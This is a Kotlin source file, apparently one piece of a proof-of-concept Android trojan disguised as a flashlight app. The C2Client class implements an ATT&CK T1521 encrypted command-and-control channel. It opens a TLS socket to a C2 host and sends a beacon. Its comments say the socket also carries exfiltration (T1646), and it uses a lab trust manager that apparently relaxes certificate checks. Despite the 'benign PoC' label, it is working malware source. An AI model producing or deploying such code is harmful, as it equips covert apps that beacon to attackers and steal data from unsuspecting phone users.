package com.utiltools.flashlight.c2

import android.util.Log
import java.io.OutputStream
import java.net.Socket
import javax.net.ssl.SSLContext
import javax.net.ssl.SSLSocket

/**
 * PoC-only. Self-built benign proof-of-concept, isolated lab only.
 * Implements ATT&CK Mobile T1521 (Encrypted Channel):
 * https://attack.mitre.org/techniques/T1521/
 *
 * Opens a TLS socket to poc-c2-server (my own test infrastructure) and
 * sends a short beacon. The same socket is reused by ExfilModule for
 * T1646 (Exfiltration Over C2 Channel).
 */
class C2Client(
    private val host: String,
    private val port: Int
) {
    companion object {
        private const val TAG = "PoC-T1521-C2"
    }

    private var socket: SSLSocket? = null

    /** Opens the TLS connection and sends a beacon line. Returns the open socket's output stream, or null on failure. */
    fun connectAndBeacon(beacon: String): OutputStream? {
        return try {
            val context = SSLContext.getInstance("TLS")
            context.init(null, arrayOf(LabTrustManager), null)

            val raw = Socket(host, port)
            val tlsSocket = context.socketFactory.createSocket(raw, host, port, true) as SSLSocket
            tlsSocket.startHandshake()
            socket = tlsSocket

            val out = tlsSocket.outputStream
            out.write(beacon.toByteArray())
            out.flush()

            Log.i(TAG, "c2_beacon_sent host=$host port=$port bytes=${beacon.length}")
            out
        } catch (e: Exception) {
            Log.w(TAG, "c2_connect_failed host=$host port=$port error=${e.message}")
            null
        }
    }

    fun close() {
        socket?.close()
        socket = null
    }
}
